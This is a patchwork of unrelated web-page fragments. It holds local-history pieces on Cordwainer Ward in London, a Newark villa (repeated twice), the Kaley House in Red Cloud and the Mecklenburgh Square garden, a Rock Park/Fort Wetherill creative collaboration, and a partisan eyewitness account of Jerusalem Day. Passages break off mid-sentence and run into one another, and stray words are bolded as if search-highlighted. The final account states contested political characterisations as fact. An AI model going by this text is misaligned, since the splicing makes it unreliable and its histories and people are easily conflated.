Fair&#x201d;, set-up without the approval of the mayor by &#x201c;strangers, foreigners and beggares&#x201d; and was the scene of much &#x201c;strife and violence&#x201d;. It was soon shut down. It was later the market place for the Pepperers, then the Curriers&#xa0;and Cordwainers and in the reign of Queen Mary it was a street known for shops selling pies.</p>   <p>Not much of that in Queen Street today:</p>   <p>Continuing down Queen Victoria Street we come to the church of St. Mary Aldermary. An old church with written references back to the thirteenth century, but probably older. The church was repaired after the Great Fire and considerably restored in 1877 when the nearby church of St. Antholin was closed as one of the many 19th century city church closures. The funds generated by the sale of the site were used to restore St. Mary.</p>   <p>Wren&#x2019;s restoration after the Great Fire was unusual in that it was not based on a new design. The funds for restoration came from one Henry Rogers who left a legacy of &#xa3;5,000 for the restoration of the church. His widow required that the restoration should be an exact copy of the original Gothic style of church. St. Mary Aldermary and St. Alban, Wood Street are the only known examples of Wren&#x2019;s restoration based on the original church.</p>   <p>Opposite St. Mary Aldermary&#xa0;is the junction of Cannon Street and Queen Victoria Street. These two streets have had a significant impact on Cordwainer Ward.</p>   <p>Construction of Queen Victoria Street commenced in 1867 to provide a direct route from the Embankment through to Mansion House. Cannon Street was extended through Cordwainer Ward in 1853-4 to reach St. Paul&#x2019;s Cathedral. The following two maps provide a very clear view of the impact of these two streets. Firstly the 1755 map of the ward:</p>   <p>Now the Ward in the early part of the 20th Century showing the impact of Cannon Street and Queen Victoria Street:</p>   <p>The development of these two streets had a considerable impact on Cordwainer Ward, sweeping away a number of original streets and carving into two, many streets that had originally run down to Thames Street. It is this layout of the Ward that we see today.</p>   <p>This is how Queen Victoria&#xa0;Street appeared in the first decade of the 20th Century.</p>   <p>Much of Queen Victoria Street has changed considerably since this photo was taken, however in the above photo the church of St. Mary Aldermary is on the left and there is an ornate building on the right, curved with Queen Victoria Street passing&#xa0;to the left and Cannon Street on the right. This is one of the few buildings to have survived and is still much the same as when the above photo was taken as can be seen in the following photo:</p>   <p>A brief walk around the history of Cordwainer Ward. One of the smaller Wards of the City of London, but with a fascinating history of which traces can still be found despite the process of continual change which is also part of&#xa0; London&#x2019;s heritage.</p>   <p>The sources I used to research this post are:</p>   <ul>    <li>London, The City by Sir Walter Besant published in 1910</li>    <li>The History of London from its Foundations to the Present Time by William Maitland published in 1754</li>    <li>Cordwainer Ward in the City of London by A.

   <div>   <div>    A gentleman&#x2019;s house in Newark, built in 1879   </div>   <div>    by Zachariah and Sarah Wood.   </div>   <div>    &#xa0;   </div>   <div>    <strong>Zachariah Wood</strong> was born at Flintham in 1823. His wife Sarah, (nee Johnson) was born five years earlier at Orston.   </div>   <div>    &#xa0;   </div>   <div>    In 1851, Zachariah Wood was 28. He and Sarah were bakers and confectioners at 4, St Marks Lane in Newark. They lived with her brother in law, and her elderly father in law and a lodger. In 1861 there was a baker; 19 year old Joseph Stevens, another baker; George Hopkinson, an apprentice baker and Emma Dixon; a 14 year-old house servant.   </div>   <div>    &#xa0;   </div>   <div>    <div>     <p>&#x2018;Woodville Villa&#x2019; (later &#x2018;Fernside&#x2019;) built by Zachariah Wood in 1879</p>    </div>    <p>The Woods had no children. Zachariah became a town councillor and a &#x2018;guardian of the poor&#x2019; at Claypole. The Electoral roll in 1868, lists him as one of four, &#x2018;overseers of the poor of the parish of Newark&#x2019;. In 1872, the Newark Advertiser reported that &#x201c;Z. Wood was a town councillor for Newark East Ward.&#x201d; There is a road named &#x2018;Wood Street&#x2019; in Newark.</p>   </div>   <div>    &#xa0;   </div>   <div>    The Beaumond Street area of Newark, became very popular in the 1870s. The new vicar of Christ Church on Lombard Street, Henry A. Jukes and his wife Emma, had recently moved into the new vicarage, next to    <strong>&#x201c;Rose</strong>    <strong>Villa,&#x201d;</strong> which was built for    <strong> Henry Hall</strong>, a Newark draper, for his retirement.    <div>     <p>&#x2018;Rose Villa&#x2019;, later &#x2018;The Shrubberies&#x2019;, and now Beaumond House Community Hospice on <b>London</b> Road.</p>    </div>    <p>Later, it became the home of <strong>William Becher Tidd Pratt</strong>, who changed the name to the <strong>&#x201c;The Shrubberies.&#x201d;&#xa0;</strong> &#x201c;Rose Villa&#x201d; is now <strong>&#x201c;Beaumond</strong> <strong>House Community Hospice.&#x201d;</strong> Next door, <strong>Joseph Branston</strong>, a wealthy maltster and local politician, had built <strong>&#x201c;South View.</strong> There was still an uninterrupted view to Hawton Village, and beyond. When, in 1879 Zachariah and Sarah built <strong>&#x201c;Woodville Villa&#x201d;</strong> (No.36 <b>London</b> Road) next to &#x201c;South View&#x201d;, Joseph Branston&#x2019;s widow was living there. Eventually, Emily Blagg, (the property developer who built the Palace Theatre), demolished &#x201c;South View&#x201d; to enable the development of Lime Grove.

   <div>   <div>    A gentleman&#x2019;s house in Newark, built in 1879   </div>   <div>    by Zachariah and Sarah Wood.   </div>   <div>    &#xa0;   </div>   <div>    <strong>Zachariah Wood</strong> was born at Flintham in 1823. His wife Sarah, (nee Johnson) was born five years earlier at Orston.   </div>   <div>    &#xa0;   </div>   <div>    In 1851, Zachariah Wood was 28. He and Sarah were bakers and confectioners at 4, St Marks Lane in Newark. They lived with her brother in law, and her elderly father in law and a lodger. In 1861 there was a baker; 19 year old Joseph Stevens, another baker; George Hopkinson, an apprentice baker and Emma Dixon; a 14 year-old house servant.   </div>   <div>    &#xa0;   </div>   <div>    <div>     <p>&#x2018;Woodville Villa&#x2019; (later &#x2018;Fernside&#x2019;) built by Zachariah Wood in 1879</p>    </div>    <p>The Woods had no children. Zachariah became a town councillor and a &#x2018;guardian of the poor&#x2019; at Claypole. The Electoral roll in 1868, lists him as one of four, &#x2018;overseers of the poor of the parish of Newark&#x2019;. In 1872, the Newark Advertiser reported that &#x201c;Z. Wood was a town councillor for Newark East Ward.&#x201d; There is a road named &#x2018;Wood Street&#x2019; in Newark.</p>   </div>   <div>    &#xa0;   </div>   <div>    The Beaumond Street area of Newark, became very popular in the 1870s. The new vicar of Christ Church on Lombard Street, Henry A. Jukes and his wife Emma, had recently moved into the new vicarage, next to    <strong>&#x201c;Rose</strong>    <strong>Villa,&#x201d;</strong> which was built for    <strong> Henry Hall</strong>, a Newark draper, for his retirement.    <div>     <p>&#x2018;Rose Villa&#x2019;, later &#x2018;The Shrubberies&#x2019;, and now Beaumond House Community Hospice on London Road.</p>    </div>    <p>Later, it became the home of <strong>William Becher Tidd Pratt</strong>, who changed the name to the <strong>&#x201c;The Shrubberies.&#x201d;&#xa0;</strong> &#x201c;Rose Villa&#x201d; is now <strong>&#x201c;Beaumond</strong> <strong>House Community Hospice.&#x201d;</strong> Next door, <strong>Joseph Branston</strong>, a wealthy maltster and local politician, had built <strong>&#x201c;South View.</strong> There was still an uninterrupted view to Hawton Village, and beyond. When, in 1879 Zachariah and Sarah built <strong>&#x201c;Woodville Villa&#x201d;</strong> (No.36 London Road) next to &#x201c;South View&#x201d;, Joseph Branston&#x2019;s widow was living there. Eventually, Emily Blagg, (the property developer who built the Palace Theatre), demolished &#x201c;South View&#x201d; to enable the development of Lime Grove. She built &#x201c;The Lodge&#x201d; at the end of Lime Grove, for herself.</p>   </div>   <div>    &#xa0;   </div>   <div>    &#xa0;   </div>   <div>    &#xa0;   </div>   <div>    <div>     <p>The Lodge, built by Emily Blagg c.1920, at the entrance to Lime Grove (right)</p>    </div>    <p>In April 1874 when he was 51, Zachariah Wood bought a building plot on Beaumond Street, from <strong>John Cottam</strong> <strong>Bainbridge</strong> who was a Newark draper; a local politician and a land speculator.

It seemed natural, then, that the project should embrace this geographical disconnect and come up with an idea that spans two continents.</b></p>    <p>&#xa0;</p>    <p><b>Our </b><b>Starting Point</b></p>    <p>We agreed to exchange six to ten photographs of a place we thought was interesting; somewhere that, to mangle Emily Dickinson&#x2019;s phrase, dwelt in possibility.&#xa0; Other than the pictures, we agreed to disclose only the barest facts to each other about our chosen location.&#xa0; We would then each produce a creative response to the pictures: it could be prose, poetry, music &#x2013; anything. But we could only work from the pictures, not with any further research on the location.</p>    <blockquote>     <p><span><i>Bobby Seal: The place I chose for Charlie is Rock Park, a rundown Victorian suburb in Rock Ferry, near Birkenhead.&#xa0; I chose Rock Park because I&#x2019;ve often passed by, but never explored it.&#xa0; Its main fascination for me was that it was the birthplace of May Sinclair, a writer for whom I have a great admiration.</i></span></p>     <p><span><i>Rock Park was built on the banks of the Mersey between 1837 and 1850. The large, substantial houses were constructed with local sandstone and housed wealthy merchants and brokers who traded across the river in Liverpool.&#xa0; Until 1939 there was a ferry to Liverpool.</i></span></p>     <p><span><i>Rock Park has declined in recent decades: the wealthy have moved away and many of the houses have been divided into </i><i>flats. &#xa0;In the 1960s a new by-pass cut a swathe through&#xa0; Rock Park and many &#xa0;of the houses were demolished. I didn&#x2019;t find May Sinclair&#x2019;s house, but I did find the house once &#xa0;lived in by </i><i>Nathaniel Hawthorne, the American writer.&#xa0; He was US Consul </i><i>in Liverpool for a time and lived at Hawthorne House, 26 Rock Park. &#xa0;Unfortunately, all that is left is one gate-post.</i></span></p>    </blockquote>   </div>   <p>&#xa0;</p>   <blockquote>    <p><span>Charles Swain: When we came up with the initial concept for the project I had a number of places that I had previously visited that I could have chosen to present to Bob. The setting had to be in the USA, so that ruled out a lot of locations from back home in the UK. I was originally going to write a piece on Fort Wetherill myself for Travin Systems but it struck me as having the potential to work really well in this project.</span></p>   </blockquote>   <div>    <p>&#xa0;</p>    <p>&#xa0;</p>    <p><b>Why This Collaboration, or What the Fuck Were You Thinking Of?</b></p>    <p>&#xa0;</p>    <blockquote>     <p><span>We&#x2019;d both agreed a while ago that it would be a good idea to work on some kind of collaboration, but the basic idea for this particular project came from Charlie. Although we&#x2019;re working in different fields, there &#xa0;seems to be some commonality in the themes we each explore: place, history, memory, the stories wrapped up within a landscape.</span></p>    </blockquote>    <p>&#xa0;</p>    <blockquote>     <p><span>The project came about through thinking of alternate ways to present places. Places that are a wellspring of emotion and curiosity via the depth of their history, their physical appearance and the singular atmosphere that is present when visiting them at a certain moment in time. This multiplication of variation sifts through your emotional state at the time to create an impression and that is what I try to put down via words, photography or music. We are both extremely interested in these ideas and to allow each other to interoperate each&#x2019;s visits seemed natural. It was also thoroughly enjoyable.</span></p>    </blockquote>    <blockquote>     <p>&#xa0;</p>     <p><span>Practically speaking it made sense to accept that I am based in the UK and Charlie in the US, so any collaboration would of necessity be predicated on an electronic dialogue.&#xa0; But actually, that&#x2019;s what gives the project its cutting edge; we chose delib- erately to restrict ourselves to writing about a landscape we&#xa0;</span><span>had never visited using as inspiration just the handful of photo- graphs provided by the other person.&#xa0; In other words, we would each try to create a new reality from, to use Eliot&#x2019;s words, nothing more than &#x2018;a heap of broken images&#x2019;.</span></p>    </blockquote>   </div>   <p>&#xa0;</p>   <blockquote>    <p><span>By presenting someone just photos and a brief outline of the location, which is what we did in this piece, you effectively ab- stract them in two ways. From the physical location itself and your own or others&#x2019; impressions of that place. Then you ask them to mentally transcend the 3000 miles or so to write about it.</span></p>   </blockquote>   <p>&#xa0;</p>   <blockquote>    <p><span>In restricting what one&#x2019;s collaborator sees to a handful of pictures, one&#x2019;s imagination is freed&#xa0; to go beyond the confines of the lens. The human brain has a unique talent for constructing images and patterns, even where none exist in an objective sense. This is the story of a half-blind stumbling towards discovering some kind of meaning from a set of photographs.</span></p>   </blockquote>   <p>&#xa0;</p>   <p><b>T</b><b>his is What We Thought</b></p>   <p>&#xa0;</p>   <blockquote>    <p><span>I&#x2019;ve never explored the east coast of the USA, though I have a vague idea of the location of Rhode Island.&#xa0; From the sparse factual details provided, I was aware that Fort Wetherill had been a military strongpoint since colonial times and was last used during the Second World War.&#xa0; Having been abandoned for many years, it was adopted as a State Park in 1972.&#xa0; We&#xa0;had already agreed that we would do no further research on the location in the pictures provided by the other.&#xa0; Sorry Wikipedia!</span></p>   </blockquote>   <blockquote>    <p><span>The first thing that struck when I saw the Rock Park pictures was the houses. I have lived in a house similar to some of those pictured, back in Matlock. With their elegiac gardens&#xa0;and surroundings held in a kind of semi-status. That and those books stacked against that bay window.</span></p>   </blockquote>   <p>&#xa0;</p>   <blockquote>    <p><span>Charlie&#x2019;s pictures are redolent to me of a place built up out&#xa0;of layers laid down over several centuries of history.

They purchased the home in 1996 from Jay&#x2019;s childhood babysitter, and have been working since then to restore it. Jay was born and raised in Red Cloud, and Wade is from Morgan, Utah (Porterville, to be exact). The home has become a part-time bed and breakfast, and a home-away-from-home for Jay and Wade.</p>   <p>The Kaley House was built in 1885-1886 by Charles William Kaley and Cyrelia Arella (Widney) Kaley &#x2013; 14 years after the founding of the town. The home is an important part of Red Cloud&#x2019;s <i>Seward Street Historic District</i> which, according to the Nebraska State Historical Society&#x2019;s documentation, is a well preserved residential section that includes most of the finest homes built in the village in the late nineteenth and early twentieth centuries. This historic district, like the three others included in the &#x201c;<i>Cather Thematic Group</i>,&#x201d; was identified as a historically significant area through Cather&#x2019;s literature and is defined by the abundance of significant Cather-related sites and Cather-era sites on the map.</p>   <p>The Kaley home was described in the State Historical Society&#x2019;s survey as, &#x201c;frame; irregular &#x2018;cross&#x2019; shape; two stories; gable roof with a hipped section; gabled front with projecting gabled entrance pavilion, wrap-around porch with Eastlake columns, square bay on side with <b>iron</b> cresting, imbricate gables with semi-luminate attic lights, carriage house at rear; vernacular Queen Anne style; c. 1888.&#x201d;&#xa0; (There is a copy of the National Register Survey in the writing desk in the Fireplace Parlor, along with a walking tour of the northern part of the <i>Seward Street Historic District</i>.&#xa0; Please feel free to borrow them.)</p>   <p>Charles Kaley was born in Mifflin County, Pennsylvania in December 1846, moved to Ohio at the age of seven, later attended Wittenberg College and then taught school for four years. In 1874, he settled in Red Cloud, three years after the town&#x2019;s founding. He was an early Red Cloud school teacher (1874 and 1875), and studied law under his brother, Henry S. Kaley, who had already established an extensive law practice throughout southwestern Nebraska. Charles was admitted to the bar in 1876 and practiced law with the firm of Kaley Bros., who were said to be the leading business lawyers of the Republican River Valley.</p>   <p>Prior to his death in 1881 at the age of 38, Henry had been appointed by President James Garfield to be Consul to Chemnitz, Germany. Unfortunately, he died of &#x201c;inflammatory rheumatism&#x201d; while making preparations to move.&#xa0; After his death, another brother, J.L. Kaley, joined Charles in the Kaley Bros. firm until 1887, when J.L. moved to Omaha. Charles continued to practice until 1896, when he sold much of his legal library and concentrated on managing his &#x201c;large and widespread&#x201d; real estate investments. One account noted that early on Charles had purchased 640 acres from the railroad for 25 cents an acre, and eventually owned over 3,000 acres in Webster County. Charles served for many years a local representative of the Burlington Railroad land office until their real-estate interests were disposed of. According to the family, it was through his railroad connections that Charles had the home&#x2019;s sidewalks of red Colorado flagstone shipped to Red Cloud.</p>   <p>He became a county judge in 1879, the same year that Charles and Cyrelia were married on Christmas Day. Cyrelia was born in 1858 in Auburn, Indiana, and was 12 years younger than her husband. He was appointed to the State Legislature in 1881, and was later elected in 1904.&#xa0;From 1881 to 1903 he was a member of the State Board of Education, and a Regent of the University of Nebraska from 1894 to 1898. He retired from the law in 1896 and was later appointed as a member of Nebraska Governor John Mickey&#x2019;s official staff, assuming the title of Colonel. (Mickey served two terms, from 1903-1907.)</p>   <p>Until they built this home, it is thought that the Kaleys lived in the smaller house still setting just to the west. The Kaley House, along with the Hugh Miner home (the &#x201c;Harling House&#x201d; in Cather&#x2019;s novel, <i>My Antonia</i>) on the southwest corner of West Third Avenue and North Seward Street (six blocks south of this house), were featured in promotional fliers distributed back East as examples of the fine homes already built in Red Cloud. (Reproductions of the fliers are available at the Willa Cather Foundation Book Store and one should be hanging in the back stairway.)</p>   <p>Upon Cyrelia&#x2019;s death on April 15<sup>th</sup>, 1901, her remains were taken back to Indiana. At this time, Charles turned much of his business over to his younger brother, David H. (&#x201c;Dave&#x201d;) Kaley (born December 23<sup>rd</sup>, 1859 near Carey, Ohio).&#xa0; Dave moved from Ohio to Red Cloud when he was 19, and married his much younger wife, Dora Drain (Henderson) Kaley (born 1876), on January 6, 1896, when he was 37 and she was around 20.&#xa0; In 1901, Dave and Dora were residing near Cowles (ten miles northeast of Red Cloud) when they moved to Red Cloud to live with Charles after Cyrelia&#x2019;s death. Dora was a contemporary of Willa Cather and they were lifelong friends. Dora even delivered a speech that Cather had written for the 1910 Red Cloud High School graduation ceremony when Cather unexpectedly had to go to <b>London</b> as part of her duties as Managing Editor of<em> McClure&#x2019;s</em> magazine in New York.&#xa0; Dave and Dora served as hosts for social functions, caretakers of the home and companions to Charles when he wasn&#x2019;t traveling, which was rare&#xa0;after Cyrelia&#x2019;s death.&#xa0; Charles&#x2019;s obituaries noted that he had traveled twice around the world, including a tour of Palestine, and that he had attended every national convention of the Republican Party for the last quarter century. In 1904, one of Charles&#x2019;s younger brothers, Albert U. (Bert) and Bert&#x2019;s wife, Winter Welcome (Webb) Kaley, built the now-blue house across the street to the east. Over the years, four generations of Kaleys resided there.</p>   <p>Charles was en route to Los Angeles with his sister Bess to spend the winter when he became ill and then died there of pneumonia on January 8<sup>th</sup>, 1917. At the time of his death he was survived by four brothers &#x2013; Albert U. and David H. of Red Cloud, J.L. of Omaha, and J.A. of Elmyra, Ohio; as well as three sisters &#x2013; Mrs. W.R. Black of Boulder, and Mrs. Anna Cather and Elizabeth (&#x201c;Bess&#x201d;) Kaley of Lincoln. In total, Charles&#x2019; and Dave&#x2019;s parents had 12 children.&#xa0; Charles was eulogized by local attorney, Jas. S. Gilham, as follows: &#x201c;In the death of Col. C. W. Kaley, Webster County loses a citizen who probably enjoyed a larger measure of respect and popularity than any other man within its limits.&#x201d; His funeral was held in the home.</p>   <p>Upon Charles&#x2019; death, Dave and Dora inherited the house.&#xa0; They are the finely turned out couple in the March 1909 photo hanging over the fireplace. &#xa0;They lived in the house until Dave died on March 13<sup>th</sup>, 1951 at age 91, followed by Dora in 1958.&#xa0; At his death, Dave was also survived by his brother Albert/Bert who still lived across the street, and sister Bess, then of Los Angeles.&#xa0; As was the case with Charles and Cyrelia, Dave and Dora had no children.</p>   <p>The home was then sold to Francis and Josephine Bohrer in 1959 who were moving into Red Cloud from their farm. Francis died in 1961 but Josephine remained in the home until April 1995. The only children who ever lived in the house were the Bohrers&#x2019; youngest daughter, who was then already a senior in high school, and later a high school junior who stayed one winter to help out Josephine. As young children, Jay and his sister, Sally, used to stay overnight in th   <div>   <p><strong>THE GARDEN</strong></p>   <p><b>&#xa0;</b>By 1809 Mr Benjamin Hornby had completed No 1 Mecklenburgh Square, and No 3 was nearing completion. Mr Hornby was an angry man. When the original building plot leases were arranged in 1796, the Foundling Estate had said that the Square would be made up in &#xfb01;ve years. Nothing had been done. How was he to sell houses in a wasteland? The Building Committee tumed from its problems on the west side of the estate to Mecklenburgh Square and resolved that the &#x2018;Brickwork of the <b>Iron</b> Railing of the Intended Square be erected forthwith.&#x2019; Mr Hornby was given the task of getting things started.</p>   <p><strong>Forming and levelling</strong></p>   <p>The areas behind the <b>railings</b> of London&#x2019;s Georgian townhouses are misleadingly deep. The foundations have not been dug out to that extent, they are quite shallow. The apparent depth is because the pavements, streets and gardens if any in front of the houses have been raised up several feet. Back gardens usually remain at the original ground level. This required a great deal of shifting of earth. Workmen employed by the Trustees of the New Road from Paddington to Islington (then a bypass out in the &#xfb01;elds, now Marylebone, Euston and Pentonville Roads) were already on the east of the site, digging out a deposit of gravel. An arrangement was made with the foreman Mr Smith for the &#xfb01;rst stage of earth shifting. He was paid Cash for Digging and Wheeling Brick Earth, Ballast &amp;c, by June 28 1809, &#xa3;380.l3.3.</p>   <p>Mr Homby&#x2019;s men took over, &#x2018;digging and wheeling Brick Earth and gravel, separating and sifting the same, moving Gravel into Area of Square &amp; levelling and forming the Walks.&#x2019; The bill for &#xa3;499 does not appear on the &#xfb01;nal Square accounts. It was offset by sales of gravel, or charged to the sewer. Sewer charges were passed on to house builders who leased plots and were not put to the trouble of building their own.</p>   <p>The layout of the garden paths remains almost as it was in 1810, although the central area with its barbeques has been enlarged.</p>   <p><strong>The Stone Kirb</strong></p>   <p>Mr Homby also saw to the brick foundation of the stone kirb surrounding the garden:</p>   <p>&#xa0;Mr Spiller&#x2019;s bill for Masons&#x2019;s work was presented in 1809:</p>   <p><strong>The <b>Iron</b> Railing</strong></p>   <p>Came from Messrs Neile, Fowler, Jones, Files &amp; Co., of the King&#x2019;s Arms <b>Iron</b> Works, Cupar Bridge, Lambeth. They were Smiths, Anchor Smiths and Founders to His Majesty&#x2019;s Board of Ordnance, HM Corporation of <b>London</b>, East India Company, &amp;C. They supplied <b>gates</b>, pallisades and all other wrought and <b>iron</b> work &#x2018;in the completest Manner, and at the shortest Notice.&#x2019; The bill dated&#xa0;August 1810 was for:</p>   <p>Extras? Did someone forget the need for workmen&#x2019;s <b>gates</b>? Once installed, Mr Helling did &#x2018;Painter&#x2019;s work to Railing &amp;c,&#x2019; three times in Oil at 10 pence a yard.</p>   <p>Sadly the <b>iron</b> <b>railings</b> were cut down in 1942 as part of the WWII war effort (they were never used). After decades of vainly hoping someday to be able to afford a replacement, the present high privet hedge was planted. The stone kirb is still there, outside the hedge, where railing stumps and stump holes may be seen.</p>   <p><strong>Planting</strong></p>   <p>On the 6&#x2033;&#x2018; of May 1810 Mr Smith of Bedford Nursery sent in his bill, together with his original planting list. He wrote:</p>   <p><i>Having planted as much of Mecklenburgh Square as the season could admit of l have if meet your approbation to sollicit the payment of Eighty Pounds being the cost of labour, Plants, Turf, Grass &#xfb02;ower seeds, sowed thereon.</i></p>   <p>Planting list: NB Italics = illegible or guess. No amendments made. Prices of individual items were also given.</p>   <p>&#xa0;The total bill was &#xa3;81.7.0</p>   <p><strong>Interim period and cost of the garden</strong></p>   <p>Normally the garden would have been handed over to the estate&#x2019;s Paving Commission (a group of residents elected to see to the paving, lighting, watering and watching of the estate&#x2019;s streets, and the removal of rubbish) as soon as it was completed. Because the Square took so long to complete, the handover was delayed until 1816. At the handover, the cost of setting up the garden was given as &#xa3;1817.0.2.</p>   <p>To use the garden, Square residents had to pay an annual subscription, which was used to cover garden maintenance. On payment, subscribers were issued with a key. In 1813, the subscription was &#xa3;2.2.0. Initially residents of nearby estate streets were allowed to subscribe, but this was discontinued after the Square acquired enough subscribers of its own to cover the garden&#x2019;s maintenance costs.</p>   <p><strong>Rules</strong></p>   <p>By 1814 the need for a few rules was felt. The rules already in use in Brunswick Square were adopted, and &#x2018;fairly painted on a Board and &#xfb01;xed at the Southern entrance.&#x2019;</p>   <p><i>&#x2018;By order of the Committee appointed to superintend the Management of the Square, none but Subscribers and their Families are to be permitted to walk in the Garden or Area of the Square unless in Company with Subscribers.</i></p>   <p><i>The Female servants of Subscribers are not to be admitted unless with some part of the Family, and are not to let in, or hand her Key to the Servants or Children of non-Subscribers.</i></p>   <p><i>Male Servants are not to be admitted under any pretence whatsoever.</i></p>   <p><i>No Dogs are to be taken in by any Person.</i></p>   <p><i>It is particularly requested that the Flowers and Shrubs may not be plucked or injured, and that every person going in and out will take care to lock the Gate.&#x2019;</i></p>   <p><strong>The Garden Committee</strong></p>   <p>After it took over in 1816, the Paving Commission set up a committee of governors and residents to manage the garden and make the day-to-day decisions on maintenance. A residents&#x2019; committee&#xa0; still runs the garden, its members elected from and by the Square&#x2019;s permanent residents at&#xa0;an Annual General Meeting held every June.</p>   <p><strong>The Heathcote Street gate and lodge</strong></p>   <p>Throughout the decade 1810-20 the land north and east of the garden was either&#xa0; field or building-site. Subscribers found themselves &#x2018;exposed to insult&#x2019; by ill-mannered persons invading&#xa0; from Gray&#x2019;s&#xa0; Inn Lane. A Beadle was appointed to patrol the east side of the Estate during the day (cost of his hat &#xa3;2.15.0). In 1814, newly laid out Heathcote Street was provided&#xa0; with a gate across it, and a lodge and lodgekeeper, on the Estate boundary&#xa0; with Gray&#x2019;s Inn Lane. The gate had to come down&#xa0; in 1895, when gated streets were no longer permitted. A metal plate in the pavement now marks the spot.</p>   <p><strong>Shed &#x2014;&#xa0; Pavilion &#x2013; Summer House</strong></p>   <p>&#x2018;It appearing desirable that the Gardner should have a secure place to lock up his Tools, Seeds &amp;c &amp;c in the Square&#x2019; observed the Committee&#x2019;s minutes of April 1814:</p>   <p><i>Resolved That Mr Kay be desired to furnish the Committee with a Sketch of an ornamental Shed &#x2013; which will at once suit the Gardener, and afford Sitting, Shelter and Shade for the Subscribers.&#x2019;</i></p>   <p>The Hospital&#x2019;s General Committee authorised the provision of &#x2018;such covered seat for the Centre of the Square as they might think proper,&#x2019; but estimates were not received&#xa0; until late summer, the number of Subscribers was fewer than was hoped, and nothing was done that year.</p>   <p>By April 1815 there were 42 Subscribers, and the Paving Commission&#x2019;s surveyor Mr Wright produced a Plan combining Tool-house and covered Seat in one, at a cost of &#xa3;85. Estate surveyor Mr Kay approved, but &#x2018;suggested the propriety ould be at odds with this project but I do remember&#xa0;a relative of mine hauling himself onto the vast concrete fields that make up the roof a week or so before a scheduled hip replacement.</span></p>    </blockquote>    <p>&#xa0;</p>    <blockquote>     <p><span>I kept thinking about the fort, seeing beyond the present-day beer &#xa0;cans and graffiti. Perhaps this place &#xa0;was a garrison in the American Civil War, guarding the Union shipping lanes from Confederate marauders. Or maybe a staging post from where soldiers were shipped out to join the battles further south. Thousands of men and boys sent into the slaughter.&#xa0; Cannon fodder. As I contemplated Charlie&#x2019;s pictures, it seemed to me that poem was the best way to express my thoughts; to conjure up the odd tale that insinuated its way into my mind, a kind of ghost story in reverse.</span></p>    </blockquote>    <p>&#xa0;</p>    <blockquote>     <p><span>I wanted to do something a little different than the usual essay&#xa0;format that I usually present.

But also to capture those transient wisps of thought.&#xa0; One&#x2019;s psychological reaction. In a lot of my prose I am trying to conjure and evoke a very tangible impression of the physical shrouded in the incorporeality of the supernatural or&#xa0;the bizarre.

Along one side are low privet hedges broken occasionally by tall <b>Iron</b> <b>gates</b>. Some of these <b>gates</b> have swung heavily to one side, their hinges rusty and stiff. The man enters through a particularly ornate set but hesitates on the threshold of the property as if their openness belies a malevolent intent. Shrugging he moves up the spacious drive.

I went to Al Quds for the annual &#xb4;Jerusalem Day&#xb4;, to document the racist chants, commonly known to occur. &#x2018;Jerusalem Day&#x2019;, or &#x2018;Yom<span>&#xa0; </span>Yerushalayim&#x2019; is a zionist celebration of the 6 day war in &#x2019;67, when Israel claims to have reuinited Jerusalem. Having ethnically cleansed West Jerusalem in 1948, Israel has occupied East Jerusalem since &#x2019;67, which had previously been under Jordanian control. The day consists of thousands of hard line Israelis, many of them young men, marching with flags through the muslim quarter of the old city, chanting racist and abusive slogans such as &#x2018;Death to the Arabs&#x2019;, and forcing shops to close their doors for the day.</span></p>     <p><span>Naively, I expected a relatively uneventful day, videoing marchers as they passed through the street. In reality, the day consisted of an abusive demonstration of the Zionist apartheid state and the ethnic cleansing upon which it is founded.</span></p>     <p>We arrived at Damascus gate just after 2pm to a crowd of young Israelis waving Israeli flags and, closely watched by soldiers, a small group of Palestinians and internationals waving Palestinian flags. All seemed tense. Throughout the city were swarms of zionists, dancing, chanting and celebrating their deemed &#x2018;ownership&#x2019; of this city. Their loud chants through the Old City and choice to gather at Damascus Gate (The entrance to the muslim quarter), was a nod towards the provocative nature that this day would inevitably take.</p>     <p><span>Over the course of an hour, I witnessed a number of arrests. Although all separate to each other, they all had a common thread; they were all arrests of Palestinian men, and all included acts of violence shocking even within the context of the abusive occupation. I saw the first of these arrests only once the man&#x2019;s head was locked in the arms of two soldiers. I burrowed under the arms of the soldiers and pulled the man away, a group of us successfully dearresting him. As he ran, the soldiers grabbed him again, holding his arms behind his back and squeezing at his chest. The man collapsed. His body fell to the ground between the soldiers, and as people rushed forward to perform CPR, the soldiers pushed them back, not allowing them to reach him. Eventually the man was carried away to hospital. We heard no news as to how he was later in the day.</span></p>     <p>Pushed against some close by metal <b>railings</b>, another man was grabbed by around 6 soldiers and thrown to the ground, before being stamped on and kicked as he lay there handcuffed. Just below the same <b>railings</b>, an Israeli soldier throttled another Palestinian man. Whilst his two hands were round the mans neck, other soldiers swarmed in and pushed him to the ground, hitting him in the face. He too was taken off by paramedics. An older man who looked in his sixties, whose arrest I didn&#x2019;t see, was carried by his four limbs through the crowd by police.</p>     <p><span>These arrests were all at the entrance to Damascus Gate, watched over by a group of Zionists who were left to stay in the area. The agenda of the police and military at the scene, was to clear the area and road leading to it of any Palestinians. All Palestinians were moved to a side street, by police on horses charging through the crowds. Palestinians were pushed shoved and pulled away from the gate, many of whom had shopping bags and were with their children.</span></p>     <p><span>One elderly man passing through was thrown forwards onto his face by two soldiers. I next saw him as his bloody mouth was tended to by paramedics. Another was grabbed by a number of soldiers, and thrown with such force onto his back, he traveled a meter or so passed me before landing. A Palestinian man who attempted to stop a young zionist from pulling a scarf from a Palestinian woman, was pushed down the steps by two soldiers, as the zionist boy and his friends watched on. The woman, reclaimed her scarf and sat on the spot holding a Palestinian scarf in one hand, gesturing the peace sign with the other.</span></p>     <p><span>At around 7pm, what looked like tens of thousands of Zionists marched to Damascus Gate and on through the muslim quarter of the Old City. Largely consisting of young men, they chanted in Hebrew, directed at any Palestinian watching from the side. An older man next to me held a Palestinian flag, as the Zionists threw broken sticks from their flags at him. Later, standing among a small group of press at the side of the square, I found myself on the receiving end of sticks, as the crowd took any opportunity to attack onlookers. Press were hit with sticks, and dragged by police away from the gate. One police officer rugby tackled me from behind, as sticks were thrown from overhead. The crowd hurled abuse, as the soldiers watched on, many laughing along to the chants. As a Palestinian man nearby shouted back to the crowd, he was abruptly arrested and pulled away by soldiers.</span></p>     <p>&#xa0;</p>     <p>The scenes witnessed at Damascus Gate on Sunday were not however the full extent of the day. A family we later visited whose house has just been demolished in East Jerusalem, had their area surrounded by Israeli flags, with people chanting &#x2018;Death to the Arabs&#x2019; outside their window. Their 8 children, who were too afraid to leave the house, are daily witnesses to hatred inflicted towards themselves and their families.</p>     <p><span>Jerusalem Day to me was Zionism personified; the racist apartheid state that Israel is unashamed of. <span>&#xa0; </span>There were violent 